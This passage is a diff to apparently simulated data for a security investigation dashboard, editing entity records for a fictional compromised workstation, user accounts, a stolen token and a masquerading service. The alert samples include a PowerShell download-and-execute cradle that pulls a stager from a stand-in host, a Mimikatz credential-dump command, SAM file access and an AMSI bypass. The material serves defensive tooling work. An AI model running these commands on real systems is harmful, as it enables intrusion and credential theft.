-            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } }
+            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'—' } }
         ],
         viewAllData: [
           { time:'11 May 2026  09:20:05', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Outlook Web', 'MFA':'Push notification approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, NY, USA' } },
           { time:'11 May 2026  10:15:22', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A (domain auth)', 'Result':'Success', 'Risk Level':'None', 'Location':'—' } },
           { time:'10 May 2026  09:05:11', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Network Logon', 'Source App':'File Share (\\\\fs01)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'—' } },
           { time:'10 May 2026  06:55:00', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } },
+            details: { 'User':'m.henderson', 'Logon Type':'Interactive Logon', 'Source App':'Windows Logon (CORP-WS-045)', 'MFA':'N/A', 'Result':'Success', 'Risk Level':'None', 'Location':'—' } },
           { time:'09 May 2026  09:10:33', dot:'green',
-            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'Push approved', 'Result':'Success', 'Risk Level':'None', 'Location':'Austin, TX, USA' } }
+            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'Push approved', 'Result':'Success', 'Risk Level':'None', 'Location':'New York, NY, USA' } }
+        ]
+      },
+      recentAlerts: {
+        label: 'Recent Alerts', expanded: true, viewAll: true,
+        timeline: [
+          { time:'11 May 2026  09:32:00', dot:'red',
+            viewOnGraph: { nodeId:'alert-impossible-travel', label:'Impossible Travel', icon:'🔔', sourceEntity:'svc-azure-ad' },
+            alertProfileId: 'alert-impossible-travel',
+            detailsGrid: [
+              { label:'09:32:00 Impossible Travel (assigned user)', value:'m.henderson — NY → Bucharest', tag:'Type', tagVal:'UEBA', mitre:'T1078.004 (Valid Accounts: Cloud)', source:'Azure AD', status:'Open', severity:'Critical' }
+            ] }
         ]
       },
       remediationGuide: {
@@ -1346,7 +1438,7 @@ const ENTITIES = {
           'Distinguished Name':'CN=CORP-WS-045,OU=Workstations,DC=contoso,DC=local',
           'Owner / Managed-By':'m.henderson (CN=m.henderson,OU=Users,DC=contoso,DC=local)',
           'Last Logon':'11 May 2026  10:36:22',
-          'Last Boot':'09 May 2026  06:12:40 (EID 6005)',
+          'Last Boot':'09 May 2026  06:12:40',
           'Created':'15 Mar 2024  09:00:00',
           'Modified':'11 May 2026  10:36:55',
           'Computer Status':'Enabled',
@@ -1358,14 +1450,14 @@ const ENTITIES = {
       agentStatus: {
         label: 'Agent Status & Health', expanded: false,
         kv: {
-          'Agent Status':'🟢 Running',
+          'Agent Status':'Running',
           'Agent Version':'6.2.1',
-          'Last Sync':'11 May 2026  10:35:00 (2 min ago)',
+          'Last Sync':'11 May 2026  10:35:00',
           'Collector ID':'LC-NYC-045'
         }
       },
       gpoApplied: {
-        label: 'GPO Applied to Device', expanded: false, viewAll: true,
+        label: 'GPO Applied', expanded: false, viewAll: true,
         timeline: [
           { time:'11 May 2026  09:15:00', dot:'green',
             details: { 'Event':'Group Policy Refresh Success (1502)', 'GPO':'—', 'OU / Scope':'OU=Workstations,DC=contoso,DC=local', 'Caller':'CORP-WS-045$ (host)', 'DC':'DC01.contoso.local' } },
@@ -1374,6 +1466,34 @@ const ENTITIES = {
           { time:'05 May 2026  10:00:00', dot:'green',
             details: { 'Event':'GPO Linked to OU (5136)', 'GPO':'WS-BitLocker-Enforce', 'OU / Scope':'OU=Workstations,DC=contoso,DC=local', 'Caller':'admin', 'DC':'DC01.contoso.local' } }
         ]
+      },
+      blastRadius: {
+        label: 'Blast Radius & Asset Exposure', expanded: true,
+        blastRadius: {
+          seed: { name:'CORP-WS-045$', type:'Computer', domain:'corp.local', tier:'Tier 2 (workstation)' },
+          stats: { outgoingPaths: 2, incomingPaths: 2, crownJewels: 1, minHops: 1, tier0Reached: false },
+          // Blast radius — if the host (machine account) is compromised, what falls.
+          outgoing: [
+            { target:'CORP-SRV-01 (App Server)', crownJewel:true, hops:[
+              { from:'CORP-WS-045$', rel:'ALLOWED_TO_ACT', to:'CORP-SRV-01' }
+            ] },
+            { target:'WS-Local-Admins', hops:[
+              { from:'CORP-WS-045$', rel:'MEMBEROF', to:'WS-Local-Admins' },
+              { from:'WS-Local-Admins', rel:'GENERIC_ALL', to:'CORP-WS-046' }
+            ] }
+          ],
+          // Asset exposure — who can take over this host.
+          incoming: [
+            { source:'helpdesk-tier1', hops:[
+              { from:'helpdesk-tier1', rel:'GENERIC_ALL', to:'CORP-WS-045$' },
+              { from:'CORP-WS-045$', rel:'ADD_KEY_CREDENTIAL', to:'CORP-WS-045$' }
+            ] },
+            { source:'GPO-Editors (Workstations OU)', hops:[
+              { from:'GPO-Editors', rel:'WRITE_DACL', to:'WS-Security-Baseline (GPO)' },
+              { from:'WS-Security-Baseline (GPO)', rel:'GENERIC_WRITE', to:'CORP-WS-045$' }
+            ] }
+          ]
+        }
       },
       securityEventSummary: {
         label: 'Security Event Summary (24h)', expanded: false, hidden: true,
@@ -1482,7 +1602,7 @@ const ENTITIES = {
         ]
       },
       usersLoggedOn: {
-        label: 'Recent Logon Sessions', expanded: false, viewAll: true,
+        label: 'Users Logged On', expanded: false, viewAll: true,
         timeline: [
           { time:'11 May 2026  10:15:00', dot:'green',
             details: { 'User':'m.henderson', 'Logon Type':'Interactive (Console)', 'Source':'Keyboard', 'Session':'Active', 'Duration':'5h 22m' } },
@@ -1521,7 +1641,7 @@ const ENTITIES = {
           verdict: 'Malicious — Compromised Endpoint',
           severity: 'critical',
           recommendations: [
-            { icon:'�', title:'Determine Initial Access Vector', desc:'Was CORP-WS-045 the initial entry point or was it compromised via lateral movement from m.henderson\'s session? Check the timeline — when did the first malicious activity start?', priority:'Critical' },
+            { icon:'🎯', title:'Determine Initial Access Vector', desc:'Was CORP-WS-045 the initial entry point or was it compromised via lateral movement from m.henderson\'s session? Check the timeline — when did the first malicious activity start?', priority:'Critical' },
             { icon:'🧩', title:'Assess Forensic Evidence Needs', desc:'Determine if memory dump and disk image are needed for legal/insurance purposes before remediation destroys evidence. Check incident response SLA requirements.', priority:'Critical' },
             { icon:'📊', title:'Evaluate Rootkit Indicators', desc:'Check for kernel-level hooks, hidden processes, or bootkit artifacts. If rootkit is present, reimaging is the only safe option — patching alone won\'t suffice.', priority:'High' },
             { icon:'📝', title:'Assess Lateral Movement from This Device', desc:'ARP spoofing from CORP-WS-045 may have captured credentials from neighboring workstations on VLAN 10. Evaluate which hosts were active during the spoofing window.', priority:'High' },
@@ -1600,9 +1720,9 @@ const ENTITIES = {
       dlpPolicies: {
         label: 'DLP Policy Status', expanded: false,
         kv: {
-          'Block External Sharing of Confidential':'Active — Triggered 2× ⚠',
-          'Warn on PII Download':'Audit Only ⚠ (not blocking)',
-          'Require Justification > 50 Files':'Not Configured ⚠',
+          'Block External Sharing of Confidential':'Active — Triggered 2×',
+          'Warn on PII Download':'Audit Only (not blocking)',
+          'Require Justification > 50 Files':'Not Configured',
           'Block USB Copy of Labeled Files':'Active'
         }
       },
@@ -1692,7 +1812,7 @@ const ENTITIES = {
           ]
         }
       },
-      processDetails: {
+      serviceDetails: {
         label: 'Token Details', expanded: true,
         kv: {
           'Token Type':'OAuth 2.0 Bearer Token',
@@ -1704,10 +1824,10 @@ const ENTITIES = {
           'Refresh Token':'Active (14-day sliding window)',
           'Issuer':'https://login.microsoftonline.com',
           'Audience':'https://graph.microsoft.com',
-          'IP at Issuance':'185.220.101.42 (Tor) ⚠'
+          'IP at Issuance':'185.220.101.42 (Tor)'
         }
       },
-      tokenAnomaly: {
+      oauthConsentGrants: {
         label: 'Token Anomalies', expanded: true, viewAll: true,
         timeline: [
           { time:'Critical', dot:'red', malicious: true,
@@ -1726,7 +1846,7 @@ const ENTITIES = {
             } }
         ]
       },
-      tokenUsage: {
+      serviceTimeline: {
         label: 'Token Usage (Graph API Calls)', expanded: false, viewAll: true,
         timeline: [
           { time:'11 May 2026  09:34:12', dot:'red', malicious: true,
@@ -1795,24 +1915,6 @@ const ENTITIES = {
   'proc-powershell': {
     type: 'process', modalTitle: 'Process Details · Powershell.exe',
     sections: {
-      riskSummary: {
-        label: 'Risk Summary', expanded: true, noCollapse: true,
-        summaryCard: {
-          riskScore: 91,
-          maxScore: 100,
-          severity: 'Critical',
-          statusBadge: 'Malicious Execution',
-          metrics: [
-            { icon:'⚠', label:'AMSI Detections', value:'3', color:'#dc2626' },
-            { icon:'🔗', label:'C2 Connection', value:'Active', color:'#dc2626' },
-            { icon:'📦', label:'Payload Downloaded', value:'beacon.dll', color:'#dc2626' },
-            { icon:'🔐', label:'Encoded Commands', value:'2', color:'#ea580c' },
-            { icon:'🧬', label:'Obfuscation', value:'Base64 + IEX', color:'#ea580c' },
-            { icon:'📊', label:'Child Processes', value:'3', color:'#d97706' }
-          ],
-          investigationStatus: 'Active — Kill process recommended'
-        }
-      },
       processDetails: {
         label: 'Process Details', expanded: true,
         kv: { 'Process Name':'powershell.exe', 'PID':'4892', 'Parent Process':'powershell.exe (PID: 3104)', 'Command Line':'powershell.exe -nop -w hidden -encodedcommand ...', 'User':'<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider(&#39;user-m-henderson&#39;)">m.henderson</a>', 'Integrity Level':'Medium', 'Start Time':'11 May 2026  10:36:22', 'Status':'Running', 'Signature':'Microsoft (Valid)', 'Session ID':'2', 'Thread Count':'14', 'Handle Count':'342' }
@@ -1842,15 +1944,15 @@ const ENTITIES = {
           { time:'11 May 2026  10:36:23', dot:'red', malicious: true,
             viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-enc-powershell',
-            details: { 'AMSI Detection':'Suspicious', 'Content Preview':'IEX (New-Object Net.WebClient).DownloadString("http://staging-payload.net/stager.ps1")', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed (Defender exclusion active ⚠)', 'Script Block ID':'SB-44a2-bf91' } },
+            details: { 'AMSI Detection':'Suspicious', 'Content Preview':'IEX (New-Object Net.WebClient).DownloadString("http://staging-payload.net/stager.ps1")', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed (Defender exclusion active)', 'Script Block ID':'SB-44a2-bf91' } },
           { time:'11 May 2026  10:36:25', dot:'red', malicious: true,
             viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-enc-powershell',
-            details: { 'AMSI Detection':'Malicious', 'Content Preview':'[Reflection.Assembly]::Load($bytes) — In-memory .NET assembly load', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'Note':'Fileless execution — no disk artifact' } },
+            details: { 'AMSI Detection':'Malicious', 'Content Preview':'[Reflection.Assembly]::Load($bytes) — In-memory .NET assembly load', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed', 'Note':'Fileless execution — no disk artifact' } },
           { time:'11 May 2026  10:36:28', dot:'red', malicious: true,
             viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Database Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-sam-access',
-            details: { 'AMSI Detection':'Malicious', 'Content Preview':'Invoke-Mimikatz -DumpCreds (obfuscated)', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'MITRE':'OS Credential Dumping (T1003)' } }
+            details: { 'AMSI Detection':'Malicious', 'Content Preview':'Invoke-Mimikatz -DumpCreds (obfuscated)', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed', 'MITRE':'OS Credential Dumping (T1003)' } }
         ]
       },
       registryModifications: {
@@ -1865,7 +1967,7 @@ const ENTITIES = {
           { time:'11 May 2026  10:36:27', dot:'orange',
             viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-enc-powershell',
-            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers', 'Value':'(Modified)', 'Data':'Provider GUID removed', 'Purpose':'AMSI bypass attempt ⚠' } }
+            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers', 'Value':'(Modified)', 'Data':'Provider GUID removed', 'Purpose':'AMSI bypass attempt' } }
         ]
       },
       networkActivity: {
@@ -1876,7 +1978,6 @@ const ENTITIES = {
             alertProfileId: 'alert-c2-conn',
             details: { 'Destination IP':'185.220.101.42', 'Port':'443', 'Protocol':'HTTPS', 'Bytes Sent':'14.2 KB', 'Domain':'c2-relay.onion.ws', 'Direction':'Outbound' } },
           { time:'11 May 2026  10:36:45', dot:'red', malicious: true,
-            viewOnGraph: { nodeId:'ip-tor', label:'91.215.85.12 (Staging)', icon:'🌐', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-c2-conn',
             details: { 'Destination IP':'91.215.85.12', 'Port':'8080', 'Protocol':'HTTP', 'Bytes Sent':'2.1 KB', 'Domain':'staging-payload.net', 'Direction':'Outbound' } }
         ]
@@ -1886,14 +1987,14 @@ const ENTITIES = {
         timeline: [
           { time:'11 May 2026  10:36:30', dot:'red', malicious: true,
             viewOnGraph: { nodeId:'dev-ws045', label:'CORP-WS-045', icon:'🖥', sourceEntity:'proc-powershell' },
-            details: { 'Operation':'Write', 'File Path':'C:\\Users\\m.henderson\\AppData\\Local\\Temp\\svchost_update.dll', 'File Size':'842 KB', 'Hash (SHA256)':'a3f4b8c1d9e2...7f6a', 'Signed':'No ⚠' } },
+            details: { 'Operation':'Write', 'File Path':'C:\\Users\\m.henderson\\AppData\\Local\\Temp\\svchost_update.dll', 'File Size':'842 KB', 'Hash (SHA256)':'a3f4b8c1d9e2...7f6a', 'Signed':'No' } },
           { time:'11 May 2026  10:36:28', dot:'orange',
             viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
             alertProfileId: 'alert-sam-access',
-            details: { 'Operation':'Read', 'File Path':'C:\\Windows\\System32\\config\\SAM', 'File Size':'—', 'Hash (SHA256)':'N/A', 'Note':'Credential file access ⚠' } },
+            details: { 'Operation':'Read', 'File Path':'C:\\Windows\\System32\\config\\SAM', 'File Size':'—', 'Hash (SHA256)':'N/A', 'Note':'Credential file access' } },
           { time:'11 May 2026  10:36:31', dot:'red', malicious: true,
             viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
-            details: { 'Operation':'Write', 'File Path':'C:\\Windows\\Temp\\wuhelper.exe', 'File Size':'1.1 MB', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'Signed':'No ⚠', 'Note':'Dropped malicious service binary' } }
+            details: { 'Operation':'Write', 'File Path':'C:\\Windows\\Temp\\wuhelper.exe', 'File Size':'1.1 MB', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'Signed':'No', 'Note':'Dropped malicious service binary' } }
         ]
       },
       childProcesses: {
@@ -1960,25 +2061,25 @@ const ENTITIES = {
           severity: 'Critical',
           statusBadge: 'Masquerading Service',
           metrics: [
-            { icon:'⚠', label:'Binary Signed', value:'No ✗', color:'#dc2626' },
+            { icon:'⚠', label:'Binary Signed', value:'No', color:'#dc2626' },
             { icon:'🔗', label:'C2 Beacon', value:'Active', color:'#dc2626' },
-            { icon:'📁', label:'Binary Path', value:'C:\\Temp (suspicious)', color:'#dc2626' },
+            { icon:'📁', label:'Binary Path', value:'C:\\Windows\\Temp', color:'#dc2626' },
             { icon:'🔧', label:'Startup Type', value:'Automatic', color:'#ea580c' },
             { icon:'🛡', label:'AV Detection', value:'Trojan.GenericKD', color:'#dc2626' },
-            { icon:'📊', label:'Network Activity', value:'Periodic (5min)', color:'#ea580c' }
+            { icon:'📊', label:'Network Activity', value:'Periodic (60s)', color:'#ea580c' }
           ],
           investigationStatus: 'Active — Service stop recommended'
         }
       },
       serviceInfo: {
         label: 'Service Information', expanded: true,
-        kv: { 'Service Name':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Startup Type':'Automatic', 'Service Account':'NT AUTHORITY\\SYSTEM', 'Binary Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running', 'Description':'Provides automated Windows patching (Suspicious)', 'Signature':'Not Signed ⚠', 'Created':'11 May 2026  10:35:50', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'File Size':'1.1 MB', 'Legitimate Windows Service':'No — masquerading ⚠' }
+        kv: { 'Service Name':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Startup Type':'Automatic', 'Service Account':'NT AUTHORITY\\SYSTEM', 'Binary Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running', 'Description':'Provides automated Windows patching', 'Signature':'Not Signed', 'Created':'11 May 2026  10:35:50', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'File Size':'1.1 MB', 'Legitimate Windows Service':'No — masquerading' }
       },
       serviceTimeline: {
         label: 'Service Events', expanded: true, viewAll: true,
         timeline: [
           { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
-            details: { 'Event':'Binary Dropped', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Dropped By':'powershell.exe (PID: 4892)', 'Size':'1.1 MB', 'Signed':'No ⚠' } },
+            details: { 'Event':'Binary Dropped', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Dropped By':'powershell.exe (PID: 4892)', 'Size':'1.1 MB', 'Signed':'No' } },
           { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
             details: { 'Event':'Service Installed', 'Account':'NT AUTHORITY\\SYSTEM', 'Host':'CORP-WS-045', 'Method':'sc.exe create + registry modification' },
             action: { label:'⊘ Stop Service', type:'outline' } },
@@ -2017,7 +2118,7 @@ const ENTITIES = {
           'Required By':'None (standalone — suspicious for "update" service)',
           'Load Order Group':'(none)',
           'Start Type':'Auto — launches even without user login',
-          'Recovery':'Restart on failure (auto-restart every 60s ⚠)',
+          'Recovery':'Restart on failure (auto-restart every 60s)',
           'Similar Legitimate Service':'wuauserv (Windows Update) — name confusion tactic'
         }
       },
@@ -2074,23 +2175,66 @@ const ENTITIES = {
       riskSummary: {
         label: 'Risk Summary', expanded: true, noCollapse: true,
         summaryCard: {
-          score: 28, maxScore: 100, severity: 'Low',
+          riskScore: 28,
+          maxScore: 100,
+          severity: 'Low',
+          statusBadge: 'Privileged Account — Healthy',
+          // UB1 Risk Summary KPI strip (user_entity_spec.md §3.2): Total Events (24h),
+          // Failed Logins (24h), Recent Alerts (7d), Off-Hours Logins (7d).
           metrics: [
-            { label: 'Active Alerts', value: '0', color: '#198019' },
-            { label: 'Failed Logins (7d)', value: '2', color: '#D14900' },
-            { label: 'Risk Factors', value: '1', color: '#D14900' },
-            { label: 'Compliance', value: 'OK', color: '#198019' }
-          ]
+            { icon:'📊', label:'Total Events (24h)', value:'342', color:'#6366B3' },
+            { icon:'🔐', label:'Failed Logins (24h)', value:'0', color:'#198019' },
+            { icon:'🔔', label:'Recent Alerts (7d)', value:'1', color:'#FF5900' },
+            { icon:'🌙', label:'Off-Hours Logins (7d)', value:'2', color:'#FF5900' }
+          ],
+          // Conditional chips (UEBA-gated): Risk Score is the hero score above; Anomaly Count (7d)
+          // and Last Logon (backed by ADSUserDetails.lastLogonTime, retention-safe) shown as chips.
+          heroChips: [
+            { label:'Last Logon', value:'11 May 2026 10:15:00' },
+            { label:'Anomaly Count (7d)', value:'1' }
+          ],
+          lastAnomaly: '09 May 2026 21:15:00'
         }
       },
       usersDetails: {
-        label: 'Users Details', expanded: true,
-        kv: { 'Display Name':'Administrator', 'SAM Account Name':'admin', 'Email':'admin@contoso.com', 'Job Title':'Global Administrator', 'Department':'IT', 'Manager':'CISO (j.kim)', 'Last Logon Time':'11 May 2026  10:15:00', 'OU Name':'OU=Admins,DC=contoso,DC=local', 'Account Created':'2024-01-15', 'Password Last Set':'2026-03-01', 'MFA Status':'Enforced ✓', 'Privileged Role':'Global Admin, Exchange Admin' }
+        label: 'User Details', expanded: true,
+        kv: {
+          // ── Tier 1 · Core Identity ──
+          'Display Name':'Administrator',
+          'SAM Account Name':'admin',
+          'UPN / Logon Name':'admin@contoso.com',
+          'Email':'admin@contoso.com',
+          'Job Title':'Global Administrator',
+          'Department':'IT',
+          'Manager':'CISO (j.kim)',
+          'OU Name':'OU=Admins,DC=contoso,DC=local',
+          'Account Created':'2024-01-15',
+          // ── Tier 2 · Account State ──
+          'Account Status':'Enabled',
+          'Bad Password Count':'0',
+          'Password Last Set':'2026-03-01',
+          'Password Never Expires':'No',
+          'Smartcard Required':'Yes',
+          'Trusted for Delegation':'No',
+          'Days Since Last Logon':'0',
+          // ── Tier 3 · Provenance (AD) ──
+          'Distinguished Name':'CN=Administrator,OU=Admins,DC=contoso,DC=local',
+          'Primary Group':'Domain Admins',
+          'Domain':'contoso.local',
+          // ── Tier 4 · Hybrid / Entra ──
+          'O365 User Type':'Member',
+          'Licensed':'Yes',
+          'Strong Password Required':'Yes',
+          'Last Dir Sync':'2026-05-30 23:50:00',
+          'On-Prem Sync Enabled':'Yes',
+          'Litigation Hold':'Yes',
+          'Hidden From Address List':'No'
+        }
       },
       logonActivity: {
         label: 'Logon Activity', expanded: false, viewAll: true,
         timeline: [
-          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Hardware token ✓' } },
+          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Hardware token' } },
           { time:'11 May 2026  06:30:00', dot:'green', details: { 'Logon Type':'Remote Interactive (RDP)', 'Target Host':'DC-02', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Approved' } },
           { time:'10 May 2026  16:45:12', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'DC-01', 'Source IP':'10.0.0.10 (Admin Jump Server)', 'Status':'Success' } },
           { time:'10 May 2026  09:10:00', dot:'orange', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Failed — Wrong Password', 'Note':'Followed by success at 09:10:45' } }
@@ -2109,14 +2253,59 @@ const ENTITIES = {
           'MFA Challenges':'186 (100% pass rate)'
         }
       },
-      cloudIdentities: {
-        label: 'Cloud & Privileged Identities', expanded: false,
+      // UE1 UEBA Risk Profile (user_entity_spec.md §3.3).
+      uebaProfile: {
+        label: 'UEBA Risk Profile', expanded: false,
         kv: {
-          'Azure AD Role':'Global Administrator',
-          'PIM Status':'Eligible — activated 3x this week',
-          'Service Accounts Owned':'2 (svc-backup, svc-monitor)',
-          'Last Role Review':'2026-03-15',
-          'Conditional Access':'Admin-MFA-Always policy ✓'
+          'Risk Score':'28 / 100 — Low',
+          'Score Trend (7d)':'22 → 24 → 26 → 25 → 27 → 28 → 28',
+          'Last Anomaly Fired':'09 May 2026 21:15 (off-hours login — confirmed)',
+          'Anomaly Count By Type':'Off-Hours Login (1)',
+          'Last Score Update':'13 May 2026 03:00',
+          'Watchlisted':'No',
+          'Source':'Entra ID Sign-in Logs',
+          'Analyst Notes':'Privileged account — expected admin activity, PIM-governed.'
+        }
+      },
+      // UE12 Privileged Action Surface (user_entity_spec.md §3.3).
+      privilegedSurface: {
+        label: 'Privileged Action Surface', expanded: false,
+        kv: {
+          'Is Privileged':'Yes (Tier 0 — Global Administrator)',
+          'Privileged Path':'Direct — Domain Admins / Global Admin',
+          'MFA Required':'Yes (hardware token + Conditional Access)',
+          'Last Privileged Action':'11 May 2026 10:14:00 (PIM activation — Global Admin)',
+          'Standing vs JIT (PIM)':'JIT — PIM-eligible (8h activations)'
+        }
+      },
+      // UE7 Effective Group Memberships — transitive (user_entity_spec.md §3.3).
+      effectiveGroups: {
+        label: 'Effective Group Memberships (transitive)', expanded: false, viewAll: true,
+        timeline: [
+          { time:'Direct', dot:'orange', details: { 'Group':'Domain Admins', 'Type':'Security · Built-in', 'Path':'Direct', 'Tier-0':'Yes' } },
+          { time:'Direct', dot:'orange', details: { 'Group':'Enterprise Admins', 'Type':'Security · Built-in', 'Path':'Direct', 'Tier-0':'Yes' } },
+          { time:'Direct', dot:'green', details: { 'Group':'Exchange Admins', 'Type':'Security · Universal', 'Path':'Direct', 'Tier-0':'No' } },
+          { time:'Transitive', dot:'green', details: { 'Group':'Administrators (local DC)', 'Type':'Security · Built-in', 'Path':'via Domain Admins', 'Tier-0':'Yes' } }
+        ]
+      },
+      // UE8 Direct Reports & Manager Chain (user_entity_spec.md §3.3).
+      directReports: {
+        label: 'Direct Reports & Manager Chain', expanded: false,
+        timeline: [
+          { time:'Manager (↑1)', dot:'green', details: { 'Name':'j.kim', 'Title':'CISO', 'Department':'Security' } },
+          { time:'This User', dot:'orange', details: { 'Name':'Administrator', 'Title':'Global Administrator', 'Department':'IT' } },
+          { time:'Direct Reports (↓1)', dot:'green', details: { 'Reports':'j.martinez (Server Admin), 2 others' } }
+        ]
+      },
+      // UE3 TI — Dark Web / Breach Exposure (user_entity_spec.md §3.3). Clean state.
+      darkWebExposure: {
+        label: 'Dark Web / Breach Exposure', expanded: false,
+        kv: {
+          'Exposure Status':'No breach records found',
+          'Email Monitored':'admin@contoso.com',
+          'Feed':'Constella Dark Web Intelligence',
+          'Last Checked':'13 May 2026 03:00',
+          'Recommendation':'Continue monitoring — no action required'
         }
       },
       accountLockouts: {
@@ -2128,9 +2317,9 @@ const ENTITIES = {
       passwordHistory: {
         label: 'Password & Credential History', expanded: false,
         timeline: [
-          { time:'01 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'90-day max compliant ✓' } },
-          { time:'15 Jan 2026  10:30:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'Admin-WS', 'Password Age':'60 days', 'Policy':'Compliant ✓' } },
-          { time:'20 Nov 2025  11:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'Compliant ✓' } }
+          { time:'01 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'90-day max compliant' } },
+          { time:'15 Jan 2026  10:30:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'Admin-WS', 'Password Age':'60 days', 'Policy':'Compliant' } },
+          { time:'20 Nov 2025  11:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'Compliant' } }
         ]
       },
       groupMembershipChanges: {
@@ -2141,6 +2330,34 @@ const ENTITIES = {
           { time:'20 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Member Added to Group (4756)', 'Group':'Domain Admins', 'Member Added':'l.chen (temporary)', 'Changed By':'admin', 'Source':'DC-01', 'Justification':'Emergency break-glass — Ticket INC-4398' } }
         ]
       },
+      blastRadius: {
+        label: 'Blast Radius & Asset Exposure', expanded: true,
+        blastRadius: {
+          seed: { name:'admin', type:'User', domain:'corp.local', tier:'Tier 0' },
+          stats: { outgoingPaths: 3, incomingPaths: 1, crownJewels: 2, minHops: 1, tier0Reached: true },
+          // Blast radius — admin is Tier 0; compromise = full forest takeover.
+          outgoing: [
+            { target:'corp.local — Domain (full control)', crownJewel:true, hops:[
+              { from:'admin', rel:'MEMBEROF', to:'Domain Admins' },
+              { from:'Domain Admins', rel:'GENERIC_ALL', to:'corp.local' }
+            ] },
+            { target:'corp.local — DC hashes', crownJewel:true, hops:[
+              { from:'admin', rel:'MEMBEROF', to:'Domain Admins' },
+              { from:'Domain Admins', rel:'DC_SYNC_RIGHTS', to:'corp.local' }
+            ] },
+            { target:'svc-backup / svc-monitor', hops:[
